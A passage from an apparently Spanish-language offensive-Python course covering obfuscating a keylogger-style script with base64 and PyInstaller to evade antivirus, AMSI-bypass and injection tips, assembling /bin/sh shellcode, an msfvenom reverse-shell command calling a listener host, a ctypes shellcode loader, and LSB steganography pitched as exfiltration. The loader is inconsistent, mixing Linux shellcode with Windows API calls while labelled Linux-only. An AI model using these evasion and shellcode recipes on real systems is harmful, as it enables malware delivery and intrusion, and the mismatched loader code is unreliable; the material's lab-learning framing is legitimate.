2. PyInstaller (`pip install pyinstaller`)
3. Máquina virtual (Windows 10 u 11 sin antivirus real, como entorno de pruebas).
4. Sandbox controlado (NO en una máquina principal o red real).

---

### ✅ Técnica educativa: Ocultar un script Python en un `.exe` con obfuscación

#### Paso 1: Crea un script "sospechoso" simple (ej. simulación de keylogger)

```python
# keylogger_simulado.py
import time

def main():
    with open("registro.txt", "a") as f:
        for i in range(5):
            f.write("Tecla presionada simulada\n")
            time.sleep(2)

if __name__ == "__main__":
    main()
```

Este script solo escribe texto, pero **un antivirus podría marcarlo como sospechoso** si se comportara como un keylogger real.

---

#### Paso 2: Ofusca el contenido del script

Usamos Base64 (técnica básica de evasión):

```python
# cargador_ofuscado.py
import base64

payload = """
aW1wb3J0IHRpbWUKZGVmIG1haW4oKToKICAgIHdpdGggb3BlbigncmVnaXN0cm8udHh0JywgJ2EnKSBhcyBmOgogICAgICAgIGZvciBpIGluIHJhbmdlKDUpOgogICAgICAgICAgICBmLndyaXRlKCJUZWNsYSBwcmVzaW9uYWRhIHNpbXVsYWRhXG4iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigp
"""

exec(base64.b64decode(payload).decode())
```

---

#### Paso 3: Convierte a `.exe` (empaquetado)

```bash
pyinstaller --noconsole --onefile cargador_ofuscado.py
```

Esto crea un archivo ejecutable en `dist/cargador_ofuscado.exe`.

Este `.exe`:

- Ejecuta el código **sin mostrar ventana**.
- Crea `registro.txt` silenciosamente.
- Puede evadir antivirus que detectan solo por texto plano.

---

### 🛡️ ¿Detectará un antivirus esto?

- ⚠️ Probablemente **no lo detecte** si es un script básico y ofuscado.
- Pero si el payload real hace cosas como abrir sockets, registrar teclas, o manipular archivos del sistema, **sí lo detectará**.
- **Windows Defender** en modo normal puede dejar pasar algunas versiones ofuscadas.
- EDRs modernos lo detectan si tienen comportamiento sospechoso.

---

### 🧪 ¿Cómo mejorar la evasión (en laboratorios)?

1. Cifra el payload (XOR, AES).
2. Carga en memoria sin escribir en disco (`ctypes`, `memcpy`, etc.).
3. Inyecta código en otros procesos (técnica más avanzada).
4. Desactiva AMSI en memoria (solo para pruebas educativas).

---

### 🚫 Técnicas prohibidas fuera del laboratorio

No debes aplicar ninguna de estas técnicas en:

- Computadoras de otras personas.
- Redes de empresas sin permiso.
- Ambientes reales con antivirus sin autorización.

---

### 📦 Resumen

| Paso | Acción                                               |
| ---- | ---------------------------------------------------- |
| 1    | Escribe un script funcional.                         |
| 2    | Ofusca el código (base64, cifrado simple).           |
| 3    | Usa `exec()` para ejecutarlo en tiempo de ejecución. |
| 4    | Empaqueta como `.exe` con `pyinstaller`.             |
| 5    | Prueba en un entorno virtual controlado.             |

---

### ✅ Ejemplo final completo

**Archivo `ofuscado.py`:**

```python
import base64

payload = """
aW1wb3J0IHRpbWUKZGVmIG1haW4oKToKICAgIHdpdGggb3BlbigncmVnaXN0cm8udHh0JywgJ2EnKSBhcyBmOgogICAgICAgIGZvciBpIGluIHJhbmdlKDUpOgogICAgICAgICAgICBmLndyaXRlKCJUZWNsYSBwcmVzaW9uYWRhIHNpbXVsYWRhXG4iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigp
"""

exec(base64.b64decode(payload).decode())
```

Luego:

```bash
pyinstaller --noconsole --onefile ofuscado.py
```

Resultado: `dist/ofuscado.exe`

---

[🔼](#índice)

---

## **268. Genera Shellcodes (opcodes) con Python**

### 🧠 ¿Qué es un shellcode?

Un **shellcode** es un bloque de bytes (código máquina) que se **inyecta y ejecuta directamente en la memoria de otro proceso** o aplicación para controlar su comportamiento.

El nombre viene de que muchos shellcodes ejecutaban una **shell (línea de comandos)**, pero hoy pueden hacer cualquier cosa: abrir una reverse shell, crear un archivo, o incluso descargar malware.

> 🔧 Son instrucciones de bajo nivel (ensamblador), representadas en forma de bytes: `\x31\xc0\x50\x68...`

---

### 🔧 ¿Qué es un opcode?

Un **opcode** (código de operación) es una instrucción de CPU en forma binaria. Ejemplo:

```nasm
xor eax, eax     ; => opcode: 31 C0
push eax         ; => opcode: 50
```

En Python, los representamos como una **cadena de bytes**:

```python
b"\x31\xc0\x50"
```

---

### 🔧 ¿Qué se necesita para generar shellcodes?

1. 🧠 Conocer ensamblador o usar herramientas que lo traduzcan.
2. 🧰 Python y herramientas como:

   - `pwntools`
   - `keystone` (ensamblador)
   - `msfvenom` (de Metasploit, para payloads)

3. 💻 Un sistema Linux o WSL (ideal), o bien una VM de Kali Linux.

---

### ✅ Instalación

#### Opción 1: Usar `keystone-engine` para ensamblar instrucciones

```bash
pip install keystone-engine
```

#### Opción 2: Usar `pwntools` (más completo para explotación)

```bash
pip install pwntools
```

> ⚠️ Requiere Linux o WSL para funcionar sin problemas.

---

### 🛠️ Ejemplo paso a paso: Generar shellcode en Python con Keystone

#### Paso 1: Instalar Keystone

```bash
pip install keystone-engine
```

#### Paso 2: Código Python para generar shellcode

```python
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

# Ensamblador de 32 bits (para sistemas antiguos o educativos)
codigo = (
    "xor eax, eax;"         # eax = 0
    "push eax;"             # push 0 (NULL terminator)
    "push 0x68732f2f;"      # push '//sh'
    "push 0x6e69622f;"      # push '/bin'
    "mov ebx, esp;"         # ebx = puntero a "/bin//sh"
    "push eax;"             # push 0
    "mov edx, esp;"         # edx = 0
    "push ebx;"             # push puntero a "/bin//sh"
    "mov ecx, esp;"         # ecx = argv
    "mov al, 11;"           # syscall execve
    "int 0x80;"             # interrupción
)

# Inicializa Keystone
ks = Ks(KS_ARCH_X86, KS_MODE_32)

# Ensambla el código
shellcode, _ = ks.asm(codigo)

# Muestra el shellcode en formato \x..
formateado = ''.join(f'\\x{byte:02x}' for byte in shellcode)

print("Shellcode generado:")
print(f'b"{formateado}"')
```

---

#### 🧪 Salida esperada:

```python
Shellcode generado:
b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Este es un shellcode clásico para **invocar `/bin//sh`** en Linux (32 bits).

---

### 🛠️ Opción: Generar shellcode con Metasploit (`msfvenom`)

Metasploit tiene muchos payloads listos. Ejemplo para una **reverse shell en Linux**:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python
```

Salida:

```python
buf =  b""
buf += b"\xda\xc5\xd9\x74\x24\xf4\xba..."
```

👉 Puedes pegar ese shellcode directamente en Python.

---

### 🧩 ¿Y cómo se usa un shellcode?

Un shellcode **se inyecta y ejecuta** con:

- buffer overflows,
- inyección de código,
- shellcode loaders en Python o C.

---

### ✅ Ejemplo completo de loader de shellcode en Python

Este loader ejecuta shellcode en memoria usando `ctypes` (solo en Linux o WSL):

```python
import ctypes

# Shellcode que lanza /bin/sh
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" \
            b"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Crea un bloque de memoria ejecutable
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ptr, shellcode, len(shellcode))

# Ejecuta el shellcode
ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(ptr, -1)
```

> ⚠️ Este ejemplo se adapta mejor a **Windows shellcodes de 32 bits**. En Linux se usa `mmap` con permisos de ejecución.

---

### 🧠 ¿Qué puedes hacer con esto?

- Automatizar pruebas de shellcodes.
- Empaquetar payloads personalizados.
- Aprender exploit development.
- Simular malware para análisis.

---

### 📦 Resumen

| Elemento                 | Herramienta                   |
| ------------------------ | ----------------------------- |
| Ensamblar a shellcode    | `keystone-engine`, `msfvenom` |
| Ejecutar en memoria      | `ctypes`, `pwntools`, `mmap`  |
| Ofuscar/cifrar shellcode | `base64`, `xor`, `AES`        |
| Empaquetar a .exe        | `pyinstaller`                 |

---

[🔼](#índice)

---

## **269. Esteganografía con Python: Exfiltrar información en Imágenes**

### 🧠 ¿Qué es la esteganografía?

> **Esteganografía** = el arte de **ocultar información** dentro de otro archivo de forma que **pase desapercibida**.

A diferencia del cifrado (donde se oculta el contenido), en la esteganografía **se oculta la existencia del mensaje**.

🔍 Ejemplo común: esconder un archivo de texto dentro de una imagen sin que cambie su apariencia visual.

---

### 🎯 ¿Qué es exfiltrar información?

**Exfiltrar** significa **extraer información secreta de un sistema sin ser detectado**.
Ejemplo: un atacante que esconde datos robados en una imagen y la envía por correo sin levantar sospechas.

---

### 📌 ¿Dónde se esconde la información?

La técnica más común en imágenes es usar los **bits menos significativos (LSB)** de los píxeles para codificar los datos.

Cada píxel tiene 3 canales (Rojo, Verde, Azul). En cada canal se puede cambiar el **último bit** (el menos importante) sin que el ojo humano lo note.

---

### 🧱 ¿Qué necesitas?

- Python 3 instalado.
- Librerías:

  - `Pillow` (para procesar imágenes).
  - `stepic` (opcional, para esteganografía simple).
  - O una implementación manual en bits (más educativo).

---

### 🔧 Instalación

Abre terminal o CMD:

```bash
pip install pillow
```

> ✅ No necesitas más, lo haremos sin librerías externas complicadas.

---

### 🐍 Ocultar texto dentro de una imagen (LSB Esteganografía)

#### 📁 Paso 1: Cargar una imagen

Usaremos `.png` porque soporta imágenes **sin pérdida** (lossless).
Evita `.jpg` porque comprime y destruye los datos ocultos.

---

##### ✅ Script completo para **ocultar texto** dentro de una imagen

```python
from PIL import Image

def ocultar_texto(imagen_entrada, texto, imagen_salida):
    img = Image.open(imagen_entrada)
    binario = ''.join([format(ord(c), '08b') for c in texto]) + '1111111111111110'  # marcador de fin
    pixeles = img.getdata()

    nueva_imagen = []
    i = 0  # índice del texto en binario

    for pixel in pixeles:
        nuevo_pixel = []
        for canal in pixel[:3]:  # R, G, B
            if i < len(binario):
                canal_bin = format(canal, '08b')
                nuevo_canal = canal_bin[:-1] + binario[i]  # cambia el último bit
                nuevo_pixel.append(int(nuevo_canal, 2))
                i += 1
            else:
                nuevo_pixel.append(canal)
        nueva_imagen.append(tuple(nuevo_pixel))

    img.putdata(nueva_imagen)
    img.save(imagen_salida)
    print(f"[+] Mensaje oculto en: {imagen_salida}")

# Ejemplo de uso
ocultar_texto("original.png", "Este es un mensaje secreto", "oculta.png")
```

---

##### ✅ Script para **extraer el texto oculto**

```python
from PIL import Image

def extraer_texto(imagen):
    img = Image.open(imagen)
    pixeles = img.getdata()

    binario = ""
    for pixel in pixeles:
        for canal in pixel[:3]:
            canal_bin = format(canal, '08b')
            binario += canal_bin[-1]

    caracteres = [chr(int(binario[i:i+8], 2)) for i in range(0, len(binario), 8)]

    mensaje = ""
    for c in caracteres:
        if mensaje.endswith("ÿþ"):  # 1111111111111110 en binario
            break
        mensaje += c
    mensaje = mensaje.replace("ÿþ", "")
    print("[+] Mensaje oculto extraído:")
    print(mensaje)

# Ejemplo de uso
extraer_texto("oculta.png")
```

---

### 🔍 ¿Qué hace este código?

- Toma cada píxel y reemplaza **el último bit** de los canales de color con bits del mensaje.
- Al final, agrega un marcador especial (`1111111111111110`) para saber cuándo termina.
- El mensaje oculto no cambia visualmente la imagen (¡ni te darías cuenta!).

---

### 📷 Ejemplo fácil

1. Tienes una imagen `original.png` (por ejemplo, 500x500 px).
2. Ejecutas el primer script y ocultas el mensaje `"Contraseña: admin123"`.
3. Obtienes `oculta.png`.
4. Puedes enviar esta imagen por email, Telegram, subirla a Imgur, etc.
5. Al otro lado, ejecutas el segundo script y ves el mensaje.

---

### 🧪 ¿Limitaciones?

- No uses `.jpg`.
- Si el mensaje es muy largo, necesitarás una imagen grande.
- Si se vuelve a guardar la imagen o se modifica, se puede corromper el mensaje.

---

### 🛡️ ¿Esto evade antivirus?

Sí, en la mayoría de casos. Es solo una imagen visualmente normal.
Pero **herramientas forenses** pueden detectar patrones sospechosos si el canal LSB es manipulado.

---

### 💡 ¿Para qué más se puede usar?

- Enviar mensajes ocultos entre investigadores.
- CTFs (Capture the Flag en ciberseguridad).
- Ejercicios de exfiltración en red teams.
- Malwares que sacan datos a través de imágenes en la web.

---

### 📦 Resumen

| Acción                    | Script                                                   |
| ------------------------- | -------------------------------------------------------- |
| Ocultar mensaje en imagen | `ocultar_texto("original.png", "secreto", "oculta.png")` |
| Leer mensaje oculto       | `extraer_texto("oculta.png")`                            |

---

[🔼](#índice)

---

| **Inicio**         | **atrás 7**                                                                |
| ------------------ | -------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./4_7_Python_Hacking_y_Explotacion_de_aplicaciones_Web_con_Python.md) |
